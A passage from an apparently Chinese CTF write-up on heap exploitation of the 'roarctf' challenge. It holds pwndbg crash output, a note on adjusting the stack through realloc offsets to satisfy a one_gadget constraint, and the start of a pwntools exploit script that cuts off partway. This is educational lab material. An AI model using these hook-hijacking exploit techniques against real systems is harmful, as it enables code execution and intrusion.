class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R10  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R11  &lt;span class=&#34;number&#34;&gt;0x7f31163be6e0&lt;/span&gt; (_nl_C_LC_CTYPE_class+&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;) ◂— add    al, byte ptr [rax]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R12  &lt;span class=&#34;number&#34;&gt;0x55fc4e86dcd1&lt;/span&gt; ◂— mov    qword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R13  &lt;span class=&#34;number&#34;&gt;0x7ffedb4e1860&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R14  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R15  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBP  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSP  &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RIP  &lt;span class=&#34;number&#34;&gt;0x7f31162cb95d&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;589&lt;/span&gt;) ◂— call   rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ DISASM ]───────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7f31162cb95d&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;589&lt;/span&gt;&amp;gt;    call   rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb95f&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;591&lt;/span&gt;&amp;gt;    mov    rbp, rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb962&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;594&lt;/span&gt;&amp;gt;    jmp    &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;213&lt;/span&gt; &amp;lt;&lt;span class=&#34;number&#34;&gt;0x7f31162cb7e5&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb967&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;599&lt;/span&gt;&amp;gt;    nop    word ptr [rax + rax]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb970&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;608&lt;/span&gt;&amp;gt;    mov    rax, qword ptr [rip + &lt;span class=&#34;number&#34;&gt;0x33f501&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb977&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;615&lt;/span&gt;&amp;gt;    xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb979&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;617&lt;/span&gt;&amp;gt;    mov    dword ptr fs:[rax], &lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb980&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;624&lt;/span&gt;&amp;gt;    jmp    &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;213&lt;/span&gt; &amp;lt;&lt;span class=&#34;number&#34;&gt;0x7f31162cb7e5&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb985&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;629&lt;/span&gt;&amp;gt;    nop    dword ptr [rax]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb988&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;632&lt;/span&gt;&amp;gt;    lea    rax, [r15 - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f31162cb98c&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;636&lt;/span&gt;&amp;gt;    mov    rbp, rbx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ STACK ]────────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ rsp  &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f311681c700&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7f311681c700&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16b8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;\t&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f311660c6a3&lt;/span&gt; (_IO_2_1_stdout_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x60d780000000000a&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;\n&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffedb4e1860&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffedb4e16d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;─────────────────────────────────[ BACKTRACE ]──────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► f &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;31162cb95d &lt;span class=&#34;built_in&#34;&gt;realloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;589&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;31162cc02a &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;682&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;55f&lt;/span&gt;c4e86dcd1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;74e86&lt;/span&gt;d9a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;100000010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;100000006&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;a26cc778083a00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;7f&lt;/span&gt;fedb4e1780&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;     &lt;span class=&#34;number&#34;&gt;55f&lt;/span&gt;c4e86e258&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;        &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;db4e1860&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   f &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;a26cc778083a00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Program received signal &lt;span class=&#34;title function_&#34;&gt;SIGSEGV&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(fault address &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt; 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;00:0000│ rsp  0x7ffedb4e16a0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;02:0010│      0x7ffedb4e16b0 —▸ 0x7f311681c700 ◂— 0x7f311681c700&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;03:0018│      0x7ffedb4e16b8 ◂— 9 &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;\t&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;04:0020│      0x7ffedb4e16c0 —▸ 0&lt;span class=&#34;title function_&#34;&gt;x7f311660c6a3&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(_IO_2_1_stdout_+&lt;span class=&#34;number&#34;&gt;131&lt;/span&gt;)&lt;/span&gt; ◂— 0x60d780000000000a &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;\n&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;05:0028│      0x7ffedb4e16c8 —▸ 0x7ffedb4e1860 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06:0030│      0x7ffedb4e16d0 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;08:0040│      0x7ffedb4e16e0 ◂— 0x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;09:0048│      0x7ffedb4e16e8 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0a:0050│      0x7ffedb4e16f0 —▸ 0x7ffedb4e1860 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0b:0058│      0x7ffedb4e16f8 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0d:0068│      0x7ffedb4e1708 —▸ 0&lt;span class=&#34;title function_&#34;&gt;x7f31162cc02a&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;682&lt;/span&gt;)&lt;/span&gt; ◂— xor    esi, esi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0e:0070│      0x7ffedb4e1710 ◂— 0x7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0f:0078│      0x7ffedb4e1718 ◂— 0x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10:0080│      0x7ffedb4e1720 —▸ 0x7ffedb4e1760 —▸ 0x7ffedb4e1780 —▸ 0x55fc4e86e2c0 ◂— push   r15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11:0088│      0x7ffedb4e1728 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12:0090│      0x7ffedb4e1730 —▸ 0x7ffedb4e1860 ◂— 0x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13:0098│      0x7ffedb4e1738 —▸ 0x55fc4e86dcd1 ◂— mov    qword ptr [rbp - 0x10], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里 rsp+0x30 为 0，就满足了一个 onegadget.&lt;/p&gt;
&lt;p&gt;有时候 realloc 仍旧无法满足，那么我们尝试 realloc 偏移，realloc 调栈 的原理在于其调用 realloc_hook 前，会有多个 push 操作，利用这个可以是默写栈空间经过操作偏移后，满足要求。&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp:&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=remote(&amp;#x27;node4.buuoj.cn&amp;#x27;,29287)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./roarctf&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./roarctf&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#libc = ELF(&amp;quot;./libc-2.23.so&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: 